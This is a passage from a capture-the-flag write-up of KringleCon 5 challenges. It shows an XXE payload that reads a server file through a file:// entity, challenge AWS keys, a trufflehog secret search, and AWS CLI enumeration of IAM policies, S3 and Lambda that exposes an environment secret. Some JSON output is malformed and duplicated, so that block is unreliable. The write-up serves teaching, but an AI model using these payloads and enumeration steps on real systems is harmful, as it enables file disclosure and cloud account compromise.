</figure>
<p>We can read on the ring: <code>goldring_to_be_deleted.txt</code>. So we give that to <em>Glamtariel</em> again:</p>
<ul>
<li><code>/app/static/images/x_phial_pholder_2022/goldring_to_be_deleted.txt</code><br />
&ldquo;Hmmm, and I thought you wanted me to take a look at that pretty silver ring, but instead, you&rsquo;ve made a pretty bold REQuest. That&rsquo;s ok, but even if I knew anything about such things, I&rsquo;d only use a secret TYPE of tongue to discuss them.^She&rsquo;s definitely hiding something.&rdquo;</li>
</ul>
<p>We get 2 new hints in capital letters, <code>REQ</code> and <code>TYPE</code>. The message seems to mention that we need to change the injection point to the <code>reqType</code> value now. So we try the payload:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-xml" data-lang="xml"><span class="cp">&lt;?xml version=&#34;1.0&#34; ?&gt;</span>
<span class="cp">&lt;!DOCTYPE foo[
</span><span class="cp">&lt;!ELEMENT foo ANY &gt;</span>
<span class="cp">&lt;!ENTITY xxe SYSTEM &#34;file:///app/static/images/x_phial_pholder_2022/goldring_to_be_deleted.txt&#34; &gt;</span>]&gt;
<span class="nt">&lt;root&gt;</span>
  <span class="nt">&lt;imgDrop&gt;</span>img1<span class="nt">&lt;/imgDrop&gt;</span>
  <span class="nt">&lt;who&gt;</span>princess<span class="nt">&lt;/who&gt;</span>
  <span class="nt">&lt;reqType&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/reqType&gt;</span>
<span class="nt">&lt;/root&gt;</span>
</code></pre></td></tr></table>
</div>
</div><p>And we get…nothing. We have to choose the silver ring as input image, which is <code>img1</code>! And we get the final response:</p>
<div class="box">{<br />
  &ldquo;appResp&rdquo;: &ldquo;No, really I couldn&rsquo;t. Really? I can have the beautiful silver ring? I shouldn&rsquo;t, but if you insist, I accept! In return, behold, one of Kringle&rsquo;s golden rings! Grinchum dropped this one nearby. Makes one wonder how &lsquo;precious&rsquo; it really was to him. Though I haven&rsquo;t touched it myself, I&rsquo;ve been keeping it safe until someone trustworthy such as yourself came along. Congratulations!^Wow, I have never seen that before! She must really trust you!&rdquo;,<br />
  &ldquo;droppedOn&rdquo;: &ldquo;none&rdquo;,<br />
  &ldquo;visit&rdquo;: &ldquo;static/images/x_phial_pholder_2022/goldring-morethansupertopsecret76394734.png,200px,290px&rdquo;<br />
}</div>
<figure >
  
  
  
    <img data-src="/images/kringlecon5/objectives/obj03_25.webp" alt="Gold Ring" data-caption="Gold Ring" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='20%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:20%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Gold Ring
      
        
        
      
    </figcaption>
  
</figure>
<p>Answer: <code>goldring-morethansupertopsecret76394734.png</code></p>
<h3 id="4---recover-the-cloud-ring">4 - Recover the Cloud Ring</h3>
<hr />
<h4 id="41-aws-cli-intro">4.1 AWS CLI Intro</h4>
<table>
<thead>
<tr>
<th>Difficulty</th>
<th>Objective</th>
<th>Location</th>
</tr>
</thead>
<tbody>
<tr>
<td>1/5</td>
<td>Try out some basic AWS command line skills in this terminal. Talk to Jill Underpole in the Cloud Ring for hints.</td>
<td>Cloud Ring</td>
</tr>
</tbody>
</table>
<p>This is not a real challenge but more an introduction to <code>aws cli</code>. We need to follow what is shown in the terminal. After reading the output of <code>aws help</code>, we are asked to configure come credentials for the <em>CLI</em>.</p>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q1. Configure the default aws cli credentials with the access key AKQAAYRKO7A5Q5XUY2IY, the secret key qzTscgNdcdwIo/soPKPoJn9sBrl5eMQQL19iO5uf and the region us-east-1.</div>
<p>The credentials are configured as follows:</p>
<div class="box">$ aws configure<br />
AWS Access Key ID [None]: AKQAAYRKO7A5Q5XUY2IY<br />
AWS Secret Access Key [None]: qzTscgNdcdwIo/soPKPoJn9sBrl5eMQQL19iO5uf<br />
Default region name [None]: us-east-1<br />
Default output format [None]:</div>
<p>The result is a <code>~/.aws/config</code> file that contains:</p>
<div class="box">[default]<br />
region = us-east-1</div>
<p>and a <code>~/.aws/credentials</code> that contains our credentials in clear…not very secure:</p>
<div class="box">[default]<br />
aws_access_key_id = AKQAAYRKO7A5Q5XUY2IY<br />
aws_secret_access_key = qzTscgNdcdwIo/soPKPoJn9sBrl5eMQQL19iO5uf</div>
<p>It would be better to use a more secure way to store credentials, like using <code>aws-vault</code> and store credentials in an encrypted key vault.</p>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q2. Get your caller identity using the AWS command line</div>
<div class="box">$ aws sts get-caller-identity<br />
{<br />
  &ldquo;UserId&rdquo;: &ldquo;AKQAAYRKO7A5Q5XUY2IY&rdquo;,<br />
  &ldquo;Account&rdquo;: &ldquo;602143214321&rdquo;,<br />
  &ldquo;Arn&rdquo;: &ldquo;arn:aws:iam::602143214321:user/elf_helpdesk&rdquo;<br />
}</div>
<p>This command is used to check what user or role we have assumed with our credentials.</p>
<h4 id="42-trufflehog-search">4.2 Trufflehog Search</h4>
<table>
<thead>
<tr>
<th>Difficulty</th>
<th>Objective</th>
<th>Location</th>
</tr>
</thead>
<tbody>
<tr>
<td>2/5</td>
<td>Use Trufflehog to find secrets in a Git repo. Work with Jill Underpole in the Cloud Ring for hints. What&rsquo;s the name of the file that has AWS credentials?</td>
<td>Cloud Ring</td>
</tr>
</tbody>
</table>
<p>For this challenge we are given a <em>Git</em> repository and we have to use <code>trufflehog</code> to look for secrets that could have been commit.<br />
We first install <code>trufflehog</code> (we need to have <em>Go</em> installed):</p>
<div class="box">$ git clone <a href="https://github.com/trufflesecurity/trufflehog.git">https://github.com/trufflesecurity/trufflehog.git</a><br />
$ cd trufflehog<br />
$ go install</div>
<p>Then we can use the tool pointing directly to the repository <a href="http://haugfactory.com/orcadmin/aws_scripts.git">http://haugfactory.com/orcadmin/aws_scripts.git</a>. We get a few results but only the first one interests us and is a true positive:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon5/objectives/obj04_01.webp" alt="trufflehog git http://haugfactory.com/orcadmin/aws_scripts.git" data-caption="trufflehog git http://haugfactory.com/orcadmin/aws_scripts.git" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      trufflehog git http://haugfactory.com/orcadmin/aws_scripts.git
      
        
        
      
    </figcaption>
  
</figure>
<p>If we have already cloned the repository, we could use the following command to achieve the same result:</p>
<div class="box">$ trufflehog git file://aws_scripts</div>
<p>The secret is in the file <code>put_policy.py</code> and we can see it in the commit <code>106d33e1ffd53eea753c1365eafc6588398279b5</code> as follows:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon5/objectives/obj04_02.webp" alt="git show 106d33e1ffd53eea753c1365eafc6588398279b5" data-caption="git show 106d33e1ffd53eea753c1365eafc6588398279b5" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      git show 106d33e1ffd53eea753c1365eafc6588398279b5
      
        
        
      
    </figcaption>
  
</figure>
<p>Answer: <code>put_policy.py</code></p>
<h4 id="43-exploitation-via-aws-cli">4.3 Exploitation via AWS CLI</h4>
<table>
<thead>
<tr>
<th>Difficulty</th>
<th>Objective</th>
<th>Location</th>
</tr>
</thead>
<tbody>
<tr>
<td>3/5</td>
<td>Flex some more advanced AWS CLI skills to escalate privileges! Help Gerty Snowburrow in the Cloud Ring to get hints for this challenge.</td>
<td>Cloud Ring</td>
</tr>
</tbody>
</table>
<p>We will be re-using the credentials found in the previous challenge to go through another series of questions using <em>AWS CLI</em>.</p>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q1. Configure credentials for <code>us-east-1</code>.</div>
<p>This is the same step as we did in a previous challenge:</p>
<div class="box">$ aws configure<br />
AWS Access Key ID [None]: AKIAAIDAYRANYAHGQOHD<br />
AWS Secret Access Key [None]: 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<br />
Default region name [None]: us-east-1<br />
Default output format [None]:</div>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q2. Test credendials.</div>
<p>Same as previously:</p>
<div class="box">$ aws sts get-caller-identity<br />
{<br />
  &ldquo;UserId&rdquo;: &ldquo;AIDAJNIAAQYHIAAHDDRA&rdquo;,<br />
  &ldquo;Account&rdquo;: &ldquo;602123424321&rdquo;,<br />
  &ldquo;Arn&rdquo;: &ldquo;arn:aws:iam::602123424321:user/haug&rdquo;<br />
}</div>
<p>We are using the credentials of the user <code>haug</code>.</p>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q3. Use the AWS CLI to find any policies attached to your user.</div>
<p>We need to use the command <code>aws iam list-attached-user-policies</code> for this:</p>
<div class="box">$ aws iam list-attached-user-policies --user-name haug<br />
{<br />
  &ldquo;AttachedPolicies&rdquo;: [<br />
  {<br />
    &ldquo;PolicyName&rdquo;: &ldquo;TIER1_READONLY_POLICY&rdquo;,<br />
    &ldquo;PolicyArn&rdquo;: &ldquo;arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY&rdquo;<br />
  }],<br />
  &ldquo;IsTruncated&rdquo;: false<br />
}</div>
<p>The policy <code>TIER1_READONLY_POLICY</code> is attached to our user. This is a custom policy that can be used on other users, groups or roles.</p>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q4. View or get the policy that is attached to your user.</div>
<div class="box">$ aws iam get-policy --policy-arn arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY<br />
{<br />
  &ldquo;Policy&rdquo;: {<br />
    &ldquo;PolicyName&rdquo;: &ldquo;TIER1_READONLY_POLICY&rdquo;,<br />
    &ldquo;PolicyId&rdquo;: &ldquo;ANPAYYOROBUERT7TGKUHA&rdquo;,<br />
    &ldquo;Arn&rdquo;: &ldquo;arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY&rdquo;,<br />
    &ldquo;Path&rdquo;: &ldquo;/&rdquo;,<br />
    &ldquo;DefaultVersionId&rdquo;: &ldquo;v1&rdquo;,<br />
    &ldquo;AttachmentCount&rdquo;: 11,<br />
    &ldquo;PermissionsBoundaryUsageCount&rdquo;: 0,<br />
    &ldquo;IsAttachable&rdquo;: true,<br />
    &ldquo;Description&rdquo;: &ldquo;Policy for tier 1 accounts to have limited read only access to certain resources in IAM, S3, and LAMBDA.&rdquo;,<br />
    &ldquo;CreateDate&rdquo;: &ldquo;2022-06-21 22:02:30+00:00&rdquo;,<br />
    &ldquo;UpdateDate&rdquo;: &ldquo;2022-06-21 22:10:29+00:00&rdquo;,<br />
    &ldquo;Tags&rdquo;: []<br />
  }<br />
}</div>
<p>We only get some metadata on the policy here. The description tells us that it could give us a limited read only access to <code>IAM</code>, <code>S3</code> and <code>Lambda</code> service.</p>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q5. View the default version of this policy.</div>
<div class="box">$ aws iam get-policy-version --policy-arn arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY --version-id v1<br />
{<br />
  &ldquo;PolicyVersion&rdquo;: {<br />
    &ldquo;Document&rdquo;: {<br />
      &ldquo;Version&rdquo;: &ldquo;2012-10-17&rdquo;,<br />
      &ldquo;Statement&rdquo;: [<br />
      {<br />
        &ldquo;Effect&rdquo;: &ldquo;Allow&rdquo;,<br />
        &ldquo;Action&rdquo;: [<br />
          &ldquo;lambda:ListFunctions&rdquo;,<br />
          &ldquo;lambda:GetFunctionUrlConfig&rdquo;<br />
        ],<br />
        &ldquo;Resource&rdquo;: &ldquo;*&rdquo;<br />
      },<br />
      {<br />
        &ldquo;Effect&rdquo;: &ldquo;Allow&rdquo;,<br />
        &ldquo;Action&rdquo;: [<br />
          &ldquo;iam:GetUserPolicy&rdquo;,<br />
          &ldquo;iam:ListUserPolicies&rdquo;,<br />
          &ldquo;iam:ListAttachedUserPolicies&rdquo;<br />
        ],<br />
        &ldquo;Resource&rdquo;: &ldquo;arn:aws:iam::602123424321:user/${aws:username}&rdquo;<br />
      },<br />
      {<br />
        &ldquo;Effect&rdquo;: &ldquo;Allow&rdquo;,<br />
        &ldquo;Action&rdquo;: [<br />
          &ldquo;iam:GetPolicy&rdquo;,<br />
          &ldquo;iam:GetPolicyVersion&rdquo;<br />
        ],<br />
        &ldquo;Resource&rdquo;: &ldquo;arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY&rdquo;<br />
      },<br />
      {<br />
        &ldquo;Effect&rdquo;: &ldquo;Deny&rdquo;,<br />
        &ldquo;Principal&rdquo;: &ldquo;*&rdquo;,<br />
        &ldquo;Action&rdquo;: [<br />
          &ldquo;s3:GetObject&rdquo;,<br />
          &ldquo;lambda:Invoke*&rdquo;<br />
        ],<br />
        &ldquo;Resource&rdquo;: &ldquo;*&rdquo;<br />
      }]<br />
    },<br />
    &ldquo;VersionId&rdquo;: &ldquo;v1&rdquo;,<br />
    &ldquo;IsDefaultVersion&rdquo;: false,<br />
    &ldquo;CreateDate&rdquo;: &ldquo;2022-06-21 22:02:30+00:00&rdquo;<br />
  }<br />
}</div>
<p>We have the full details of what we are allowed to do.  We can:</p>
<ul>
<li>list <em>Lambda</em> all functions and get their function URLs</li>
<li>we can view and list the policies attached to our own user</li>
<li>we can get the policy details of <code>TIER1_READONLY_POLICY</code></li>
<li>we are explicitely denied to download <em>S3</em> objects and invoke <em>Lambdas</em></li>
</ul>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q6. List the inline policies associated with your user.</div>
<div class="box">$ aws iam list-user-policies --user-name haug<br />
{<br />
  &ldquo;PolicyNames&rdquo;: [<br />
    &ldquo;S3Perms&rdquo;<br />
  ],<br />
  &ldquo;IsTruncated&rdquo;: false<br />
}</div>
<p>We have an additional inline policy <code>S3Perms</code> attached. This policy cannot be shared and is automatically deleted if the user is deleted.</p>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q7. Get the only inline policy for your user.</div>
<div class="box">$ aws iam get-user-policy --user-name haug --policy-name S3Perms<br />
{<br />
  &ldquo;UserPolicy&rdquo;: {<br />
    &ldquo;UserName&rdquo;: &ldquo;haug&rdquo;,<br />
    &ldquo;PolicyName&rdquo;: &ldquo;S3Perms&rdquo;,<br />
    &ldquo;PolicyDocument&rdquo;: {<br />
      &ldquo;Version&rdquo;: &ldquo;2012-10-17&rdquo;,<br />
      &ldquo;Statement&rdquo;: [<br />
      {<br />
        &ldquo;Effect&rdquo;: &ldquo;Allow&rdquo;,<br />
        &ldquo;Action&rdquo;: [<br />
          &ldquo;s3:ListObjects&rdquo;<br />
        ],<br />
        &ldquo;Resource&rdquo;: [<br />
          &ldquo;arn:aws:s3:::smogmachines3&rdquo;,<br />
          &ldquo;arn:aws:s3:::smogmachines3/*&rdquo;<br />
        ]<br />
      }]<br />
    }<br />
  },<br />
  &ldquo;IsTruncated&rdquo;: false<br />
}</div>
<p>This policy allows us to list the objects of the <em>S3</em> bucket <code>smogmachines3</code>.</p>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q8. List those objects.</div>
<div class="box">$ aws s3api list-objects --bucket smogmachines3<br />
{<br />
  &ldquo;IsTruncated&rdquo;: false,<br />
  &ldquo;Marker&rdquo;: &ldquo;&rdquo;,<br />
  &ldquo;Contents&rdquo;: [<br />
  {<br />
    &ldquo;Key&rdquo;: &ldquo;coal-fired-power-station.jpg&rdquo;,<br />
    &ldquo;LastModified&rdquo;: &ldquo;2022-09-23 20:40:44+00:00&rdquo;,<br />
    &ldquo;ETag&rdquo;: &ldquo;&quot;1c70c98bebaf3cff781a8fd3141c2945&quot;&rdquo;,<br />
    &ldquo;Size&rdquo;: 59312,<br />
    &ldquo;StorageClass&rdquo;: &ldquo;STANDARD&rdquo;,<br />
    &ldquo;Owner&rdquo;: {<br />
      &ldquo;DisplayName&rdquo;: &ldquo;grinchum&rdquo;,<br />
      &ldquo;ID&rdquo;: &ldquo;15f613452977255d09767b50ac4859adbb2883cd699efbabf12838fce47c5e60&rdquo;<br />
    }<br />
  },<br />
  {<br />
    &ldquo;Key&rdquo;: &ldquo;industry-smog.png&rdquo;,<br />
    &ldquo;LastModified&rdquo;: &ldquo;2022-09-23 20:40:47+00:00&rdquo;,<br />
    &ldquo;ETag&rdquo;: &ldquo;&quot;c0abe5cb56b7a33d39e17f430755e615&quot;&rdquo;,<br />
    &ldquo;Size&rdquo;: 272528,<br />
    &ldquo;StorageClass&rdquo;: &ldquo;STANDARD&rdquo;,<br />
    &ldquo;Owner&rdquo;: {<br />
      &ldquo;DisplayName&rdquo;: &ldquo;grinchum&rdquo;,<br />
      &ldquo;ID&rdquo;: &ldquo;15f613452977255d09767b50ac4859adbb2883cd699efbabf12838fce47c5e60&rdquo;<br />
    }<br />
  },<br />
  {<br />
    &ldquo;Key&rdquo;: &ldquo;pollution-smoke.jpg&rdquo;,<br />
    &ldquo;LastModified&rdquo;: &ldquo;2022-09-23 20:40:43+00:00&rdquo;,<br />
    &ldquo;ETag&rdquo;: &ldquo;&quot;465b675c70d73027e13ffaec1a38beec&quot;&rdquo;,<br />
    &ldquo;Size&rdquo;: 33064,<br />
    &ldquo;StorageClass&rdquo;: &ldquo;STANDARD&rdquo;,<br />
    &ldquo;Owner&rdquo;: {<br />
      &ldquo;DisplayName&rdquo;: &ldquo;grinchum&rdquo;,<br />
      &ldquo;ID&rdquo;: &ldquo;15f613452977255d09767b50ac4859adbb2883cd699efbabf12838fce47c5e60&rdquo;<br />
    }<br />
  },<br />
  {<br />
    &ldquo;Key&rdquo;: &ldquo;pollution.jpg&rdquo;,<br />
    &ldquo;LastModified&rdquo;: &ldquo;2022-09-23 20:40:45+00:00&rdquo;,<br />
    &ldquo;ETag&rdquo;: &ldquo;&quot;d40d1db228c9a9b544b4c552df712478&quot;&rdquo;,<br />
    &ldquo;Size&rdquo;: 81775,<br />
    &ldquo;StorageClass&rdquo;: &ldquo;STANDARD&rdquo;,<br />
    &ldquo;Owner&rdquo;: {<br />
      &ldquo;DisplayName&rdquo;: &ldquo;grinchum&rdquo;,<br />
      &ldquo;ID&rdquo;: &ldquo;15f613452977255d09767b50ac4859adbb2883cd699efbabf12838fce47c5e60&rdquo;<br />
    }<br />
  },<br />
  {<br />
    &ldquo;Key&rdquo;: &ldquo;power-station-smoke.jpg&rdquo;,<br />
    &ldquo;LastModified&rdquo;: &ldquo;2022-09-23 20:40:48+00:00&rdquo;,<br />
    &ldquo;ETag&rdquo;: &ldquo;&quot;2d7a8c8b8f5786103769e98afacf57de&quot;&rdquo;,<br />
    &ldquo;Size&rdquo;: 45264,<br />
    &ldquo;StorageClass&rdquo;: &ldquo;STANDARD&rdquo;,<br />
    &ldquo;Owner&rdquo;: {<br />
      &ldquo;DisplayName&rdquo;: &ldquo;grinchum&rdquo;,<br />
      &ldquo;ID&rdquo;: &ldquo;15f613452977255d09767b50ac4859adbb2883cd699efbabf12838fce47c5e60&rdquo;<br />
    }<br />
  },<br />
  {<br />
    &ldquo;Key&rdquo;: &ldquo;smog-power-station.jpg&rdquo;,<br />
    &ldquo;LastModified&rdquo;: &ldquo;2022-09-23 20:40:46+00:00&rdquo;,<br />
    &ldquo;ETag&rdquo;: &ldquo;&quot;0e69b8d53d97db0db9f7de8663e9ec09&quot;&rdquo;,<br />
    &ldquo;Size&rdquo;: 32498,<br />
    &ldquo;StorageClass&rdquo;: &ldquo;STANDARD&rdquo;,<br />
    &ldquo;Owner&rdquo;: {<br />
      &ldquo;DisplayName&rdquo;: &ldquo;grinchum&rdquo;,<br />
      &ldquo;ID&rdquo;: &ldquo;15f613452977255d09767b50ac4859adbb2883cd699efbabf12838fce47c5e60&rdquo;<br />
    }<br />
  },<br />
  {<br />
    &ldquo;Key&rdquo;: &ldquo;smog-power-station.jpg&rdquo;,<br />
    &ldquo;LastModified&rdquo;: &ldquo;2022-09-23 20:40:46+00:00&rdquo;,<br />
    &ldquo;ETag&rdquo;: &ldquo;&quot;0e69b8d53d97db0db9f7de8663e9ec09&quot;&rdquo;,<br />
    &ldquo;Size&rdquo;: 32498,<br />
    &ldquo;StorageClass&rdquo;: &ldquo;STANDARD&rdquo;,<br />
    &ldquo;Owner&rdquo;: {<br />
      &ldquo;DisplayName&rdquo;: &ldquo;grinchum&rdquo;,<br />
      &ldquo;ID&rdquo;: &ldquo;15f613452977255d09767b50ac4859adbb2883cd699efbabf12838fce47c5e60&rdquo;<br />
    }<br />
  },<br />
  {<br />
    &ldquo;Key&rdquo;: &ldquo;smogmachine_lambda_handler_qyJZcqvKOthRMgVrAJqq.py&rdquo;,<br />
    &ldquo;LastModified&rdquo;: &ldquo;2022-09-26 16:31:33+00:00&rdquo;,<br />
    &ldquo;ETag&rdquo;: &ldquo;&quot;fd5d6ab630691dfe56a3fc2fcfb68763&quot;&rdquo;,<br />
    &ldquo;Size&rdquo;: 5823,<br />
    &ldquo;StorageClass&rdquo;: &ldquo;STANDARD&rdquo;,<br />
    &ldquo;Owner&rdquo;: {<br />
      &ldquo;DisplayName&rdquo;: &ldquo;grinchum&rdquo;,<br />
      &ldquo;ID&rdquo;: &ldquo;15f613452977255d09767b50ac4859adbb2883cd699efbabf12838fce47c5e60&rdquo;<br />
    }<br />
  }],<br />
  &ldquo;Name&rdquo;: &ldquo;smogmachines3&rdquo;,<br />
  &ldquo;Prefix&rdquo;: &ldquo;&rdquo;,<br />
  &ldquo;MaxKeys&rdquo;: 1000,<br />
  &ldquo;EncodingType&rdquo;: &ldquo;url&rdquo;<br />
}</div>
<p>There are multiple images and what looks like the code of a <em>Lambda</em> function. Unfortunately, we do not have the permission to download them.</p>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q9. Use the AWS CLI to list Lambda functions.</div>
<div class="box">$ aws lambda list-functions<br />
{<br />
  &ldquo;Functions&rdquo;: [<br />
  {<br />
    &ldquo;FunctionName&rdquo;: &ldquo;smogmachine_lambda&rdquo;,<br />
    &ldquo;FunctionArn&rdquo;: &ldquo;arn:aws:lambda:us-east-1:602123424321:function:smogmachine_lambda&rdquo;,<br />
    &ldquo;Runtime&rdquo;: &ldquo;python3.9&rdquo;,<br />
    &ldquo;Role&rdquo;: &ldquo;arn:aws:iam::602123424321:role/smogmachine_lambda&rdquo;,<br />
    &ldquo;Handler&rdquo;: &ldquo;handler.lambda_handler&rdquo;,<br />
    &ldquo;CodeSize&rdquo;: 2126,<br />
    &ldquo;Description&rdquo;: &ldquo;&rdquo;,<br />
    &ldquo;Timeout&rdquo;: 600,<br />
    &ldquo;MemorySize&rdquo;: 256,<br />
    &ldquo;LastModified&rdquo;: &ldquo;2022-09-07T19:28:23.634+0000&rdquo;,<br />
    &ldquo;CodeSha256&rdquo;: &ldquo;GFnsIZfgFNA1JZP3TgTI0tIavOpDLiYlg7oziWbtRsa=&rdquo;,<br />
    &ldquo;Version&rdquo;: &ldquo;$LATEST&rdquo;,<br />
    &ldquo;VpcConfig&rdquo;: {<br />
      &ldquo;SubnetIds&rdquo;: [<br />
        &ldquo;subnet-8c80a9cb8b3fa5505&rdquo;<br />
      ],<br />
      &ldquo;SecurityGroupIds&rdquo;: [<br />
        &ldquo;sg-b51a01f5b4711c95c&rdquo;<br />
      ],<br />
      &ldquo;VpcId&rdquo;: &ldquo;vpc-85ea8596648f35e00&rdquo;<br />
    },<br />
    &ldquo;Environment&rdquo;: {<br />
      &ldquo;Variables&rdquo;: {<br />
        &ldquo;LAMBDASECRET&rdquo;: &ldquo;975ceab170d61c75&rdquo;,<br />
        &ldquo;LOCALMNTPOINT&rdquo;: &ldquo;/mnt/smogmachine_files&rdquo;<br />
      }<br />
    },<br />
    &ldquo;TracingConfig&rdquo;: {<br />
      &ldquo;Mode&rdquo;: &ldquo;PassThrough&rdquo;<br />
      ],<br />
      &ldquo;SecurityGroupIds&rdquo;: [<br />
        &ldquo;sg-b51a01f5b4711c95c&rdquo;<br />
      ],<br />
      &ldquo;VpcId&rdquo;: &ldquo;vpc-85ea8596648f35e00&rdquo;<br />
    },<br />
    &ldquo;Environment&rdquo;: {<br />
      &ldquo;Variables&rdquo;: {<br />
        &ldquo;LAMBDASECRET&rdquo;: &ldquo;975ceab170d61c75&rdquo;,<br />
        &ldquo;LOCALMNTPOINT&rdquo;: &ldquo;/mnt/smogmachine_files&rdquo;<br />
      }<br />
    },<br />
    &ldquo;TracingConfig&rdquo;: {<br />
      &ldquo;Mode&rdquo;: &ldquo;PassThrough&rdquo;<br />
    },<br />
    &ldquo;RevisionId&rdquo;: &ldquo;7e198c3c-d4ea-48dd-9370-e5238e9ce06e&rdquo;,<br />
    &ldquo;FileSystemConfigs&rdquo;: [<br />
    {<br />
      &ldquo;Arn&rdquo;: &ldquo;arn:aws:elasticfilesystem:us-east-1:602123424321:access-point/f<br />
sap-db3277b03c6e975d2&rdquo;,<br />
      &ldquo;LocalMountPath&rdquo;: &ldquo;/mnt/smogmachine_files&rdquo;<br />
    }],<br />
    &ldquo;PackageType&rdquo;: &ldquo;Zip&rdquo;,<br />
    &ldquo;Architectures&rdquo;: [<br />
      &ldquo;x86_64&rdquo;<br />
    ],<br />
    &ldquo;EphemeralStorage&rdquo;: {<br />
      &ldquo;Size&rdquo;: 512<br />
    }<br />
  }]<br />
}</div>
<p>There is only one function called <code>smogmachine_lambda</code>. The function is written in <em>Python</em> and a secret <code>LAMBDASECRET</code> is configured as environment variable which is a bad practice.</p>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q10. Use the AWS CLI to get the configuration containing the public URL of the Lambda function.</div>
<div class="box">$ aws lambda get-function-url-config --function-name smogmachine_lambda<br />
{<br />
  &ldquo;FunctionUrl&rdquo;: &ldquo;<a href="https://rxgnav37qmvqxtaksslw5vwwjm0suhwc.lambda-url.us-east-1.on.aws/%22,">https://rxgnav37qmvqxtaksslw5vwwjm0suhwc.lambda-url.us-east-1.on.aws/&quot;,</a><br />
  &ldquo;FunctionArn&rdquo;: &ldquo;arn:aws:lambda:us-east-1:602123424321:function:smogmachine_lambda&rdquo;,<br />
  &ldquo;AuthType&rdquo;: &ldquo;AWS_IAM&rdquo;,<br />
  &ldquo;Cors&rdquo;: {<br />
    &ldquo;AllowCredentials&rdquo;: false,<br />
    &ldquo;AllowHeaders&rdquo;: [],<br />
    &ldquo;AllowMethods&rdquo;: [<br />
      &ldquo;GET&rdquo;,<br />
      &ldquo;POST&rdquo;<br />
    ],<br />
    &ldquo;AllowOrigins&rdquo;: [<br />
      &quot;*&rdquo;<br />
    ],<br />
    &ldquo;ExposeHeaders&rdquo;: [],<br />
    &ldquo;MaxAge&rdquo;: 0<br />
  },<br />
  &ldquo;CreationTime&rdquo;: &ldquo;2022-09-07T19:28:23.808713Z&rdquo;,<br />
  &ldquo;LastModifiedTime&rdquo;: &ldquo;2022-09-07T19:28:23.808713Z&rdquo;<br />
}</div>
<p><em>Lambda</em> function <em>URL</em>s can be created to invoke <em>Lambdas</em> externally. Here the function can be invoked externally only if we are authenticated using an <em>IAM</em> identity.</p>
<h3 id="5---recover-the-burning-ring-of-fire">5 - Recover the Burning Ring of Fire</h3>
<hr />
<h4 id="51-buy-a-hat">5.1 Buy a Hat</h4>
<table>
<thead>
<tr>
<th>Difficulty</th>
<th>Objective</th>
<th>Location</th>
</tr>
</thead>
<tbody>
<tr>
<td>2/5</td>
<td>Travel to the Burning Ring of Fire and purchase a hat from the vending machine with KringleCoin. Find hints for this objective hidden throughout the tunnels.</td>
<td>Burning Ring of Fire</td>
</tr>
</tbody>
</table>
